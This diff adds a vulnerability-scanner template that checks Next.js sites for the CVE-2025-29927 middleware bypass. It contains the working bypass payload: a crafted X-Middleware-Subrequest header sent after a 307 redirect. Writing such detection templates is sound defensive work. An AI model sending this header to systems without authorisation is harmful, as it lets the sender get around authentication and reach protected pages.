@@ -1,0 +1,55 @@
+id: nextjs-middleware-bypass-307-detection
+info:
+  name: "Next.js Middleware Bypass Detection via 307 Status Change"
+  author: n0ur5
+  severity: medium
+  description: |
+    Detects potential Next.js middleware bypass vulnerabilities by:
+    - Sending an initial request
+    - If a 307 Redirect is received, resending with x-middleware-subrequest header
+    - Flagging if the status code changes to non-307
+  reference:
+    - https://slcyber.io/assetnote-security-research-center/doing-the-due-diligence-analysing-the-next-js-middleware-bypass-cve-2025-29927/
+    - https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
+    - https://nextjs.org/blog/cve-2025-29927
+  tags: nextjs, middleware, cve-2025-29927, auth-bypass
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+
+    headers:
+      X-Nextjs-Data: "1"
+      Accept-Encoding: "gzip, deflate, br"
+      Accept: "*/*"
+      Accept-Language: "en-US;q=0.9,en;q=0.8"
+      User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
+      Connection: "close"
+      Cache-Control: "max-age=0"
+
+    matchers:
+      - type: status
+        status:
+          - 307
+
+    pipeline: true  # <-- this triggers second request if first matches
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+
+    headers:
+      X-Nextjs-Data: "1"
+      Accept-Encoding: "gzip, deflate, br"
+      Accept: "*/*"
+      Accept-Language: "en-US;q=0.9,en;q=0.8"
+      User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
+      Connection: "close"
+      Cache-Control: "max-age=0"
+      X-Middleware-Subrequest: "src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware"
+
+    matchers:
+      - type: status
+        status:
+          - "!307"  # Means it is vulnerable if status is NOT 307
